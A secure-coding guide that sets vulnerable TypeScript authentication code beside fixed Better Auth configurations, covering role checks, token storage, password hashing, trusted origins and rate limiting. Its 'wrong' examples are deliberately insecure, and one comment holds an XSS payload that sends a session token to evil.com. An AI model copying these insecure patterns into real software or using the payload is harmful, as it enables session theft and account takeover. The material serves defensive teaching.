# Wrong vs Right — auth security pairs

Five paste-runnable pairs. Each one is a **real anti-pattern** seen in production code, not a strawman. The "right" side is the minimum acceptable for `risk: high-stakes`.

---

## 1. Trusting the client for authorization

### ❌ Wrong — trust client-supplied role

```ts
// Server route handler
export async function POST(req: Request) {
  const { userId, role, action } = await req.json();

  // The client sent its own role — never trust this
  if (role !== "admin") {
    return new Response("Forbidden", { status: 403 });
  }
  await performAdminAction(userId, action);
  return Response.json({ ok: true });
}
```

A trivial DevTools-edited request bypasses the entire authorization check.

### ✅ Right — read session server-side

```ts
import { auth } from "@/lib/auth";
import { headers } from "next/headers";

export async function POST(req: Request) {
  // Server reads the session from the signed cookie — no client trust
  const session = await auth.api.getSession({ headers: await headers() });
  if (!session) return new Response("Unauthorized", { status: 401 });

  // Org-scoped role check via Better Auth's access controller
  const check = await auth.api.hasPermission({
    body: {
      organizationId: session.session.activeOrganizationId!,
      permissions: { user: ["update"] },
    },
    headers: await headers(),
  });
  if (!check.success) return new Response("Forbidden", { status: 403 });

  const { userId, action } = await req.json();
  await performAdminAction(userId, action);
  return Response.json({ ok: true });
}
```

---

## 2. Exposing the session token to JavaScript

### ❌ Wrong — store the session token where JS can read it

```ts
// Sign-in response handler
const { data } = await authClient.signIn.email({ email, password });

// Persisting a session/access token in localStorage exposes it to any XSS
localStorage.setItem("auth-token", data.session.token);

// Now an XSS payload `<script>fetch('//evil.com?t=' + localStorage.auth_token)</script>`
// exfiltrates the session and the attacker can impersonate the user from anywhere.
```

XSS on any page in the app — including a third-party widget — lifts the token. Cookies marked `httpOnly` are immune to this exfil path.

### ✅ Right — let Better Auth handle the cookie

```ts
// Server config
betterAuth({
  // defaults already enforce httpOnly + secure (when HTTPS) + sameSite="lax"
  advanced: {
    defaultCookieAttributes: {
      httpOnly: true,   // JS cannot read document.cookie for this name
      secure: true,
      sameSite: "lax",
    },
  },
});

// Client — just sign in; the browser stores the cookie automatically
await authClient.signIn.email({ email, password });
// No localStorage, no token handling in app code.

// Authenticated calls just include credentials
await fetch("/api/protected", { credentials: "include" });
```

For mobile bearer flows (where you genuinely have no cookies), keep the token in **Keychain / Keystore**, not `localStorage`.

---

## 3. Plaintext passwords / weak hashing

### ❌ Wrong — store plaintext or use unsalted SHA

```ts
// Custom "save time on hashing" disaster
import { createHash } from "node:crypto";

betterAuth({
  emailAndPassword: {
    enabled: true,
    password: {
      hash: async (password) => createHash("sha256").update(password).digest("hex"),
      verify: async ({ password, hash }) =>
        createHash("sha256").update(password).digest("hex") === hash,
    },
  },
});
```

Problems:
- Unsalted SHA-256 enables rainbow-table attacks
- Constant comparison vulnerable to timing attacks (`===` on hex strings)
- Not memory-hard — modern GPUs crack billions/sec

### ✅ Right — keep scrypt (default) or use argon2id

```ts
// Default — do nothing; Better Auth uses scrypt with per-password salt
betterAuth({
  emailAndPassword: { enabled: true },
});

// Or for argon2id (preferred where available):
import { argon2id, hash as argon2Hash } from "@node-rs/argon2";

betterAuth({
  emailAndPassword: {
    enabled: true,
    password: {
      hash: async (password) =>
        argon2Hash(password, {
          algorithm: argon2id,
          memoryCost: 19_456,   // 19 MiB
          timeCost: 2,
          parallelism: 1,
        }),
      verify: async ({ password, hash }) =>
        (await import("@node-rs/argon2")).verify(hash, password),
    },
  },
});
```

scrypt and argon2id both: salt per password, memory-hard, constant-time verify built in.

---

## 4. Missing / wildcard `trustedOrigins`

### ❌ Wrong — allow any origin

```ts
betterAuth({
  // "We'll lock this down later" — never happens
  trustedOrigins: ["*"],
});
```

Any malicious site can:
- Drive sign-up forms cross-origin (account creation spam)
- Drive `signIn.social({ callbackURL: "https://evil.com/steal" })` — open redirect on the OAuth round-trip
- Defeat Better Auth's Origin-header CSRF layer

### ✅ Right — explicit allow-list, env-aware

```ts
const ORIGINS = {
  production: [
    "https://app.example.com",
    "https://*.example.com",    // controlled subdomains only
  ],
  preview: ["https://*.vercel.app"],
  development: ["http://localhost:3000", "http://localhost:5173"],
}[process.env.NODE_ENV ?? "development"];

betterAuth({
  baseURL: process.env.BETTER_AUTH_URL,
  trustedOrigins: ORIGINS,

  // Callback URLs in signIn.social are validated against trustedOrigins too —
  // attacker can't redirect to evil.com via the OAuth flow.
});
```

Even with wildcards, scope them to **your** TLD (`*.example.com`), not unconstrained `*`.

---

## 5. No rate limits on sign-in / OTP

### ❌ Wrong — accept the global default for sensitive endpoints

```ts
betterAuth({
  emailAndPassword: { enabled: true },
  plugins: [emailOTP({ async sendVerificationOTP() { /* ... */ } })],
  // rateLimit not configured → global default 100/60s applies to /sign-in/email and /email-otp/*
});
```

100 sign-in attempts per minute per IP is plenty of room for:
- Credential stuffing (rotating through a leaked password list)
- OTP brute force (6 digits = 1M combos; 100/min via a small botnet finishes overnight)

### ✅ Right — strict custom rules + Redis storage in multi-instance

```ts
import { Redis } from "ioredis";
import { redisStorage } from "@better-auth/redis-storage";

const redis = new Redis(process.env.REDIS_URL!);

betterAuth({
  secondaryStorage: redisStorage({ client: redis, keyPrefix: "auth:" }),

  rateLimit: {
    enabled: true,
    storage: "secondary-storage",  // Redis — shared across instances
    window: 60,
    max: 100,                       // global default

    customRules: {
      "/sign-in/email":              { window: 10, max: 3 },
      "/sign-up/email":              { window: 60, max: 5 },
      "/forget-password":            { window: 60, max: 3 },
      "/sign-in/magic-link":         { window: 60, max: 3 },
      "/sign-in/email-otp":          { window: 60, max: 5 },
      "/email-otp/send-verification-otp": { window: 60, max: 3 },
      "/two-factor/verify-totp":     { window: 60, max: 5 },
      "/two-factor/verify-otp":      { window: 60, max: 5 },
      "/two-factor/verify-backup-code": { window: 60, max: 5 },
    },
  },
});
```

Pair with edge WAF / Fail2ban for IP blocking on repeated 401s. Numbers — see [recommended-defaults.md](recommended-defaults.md).
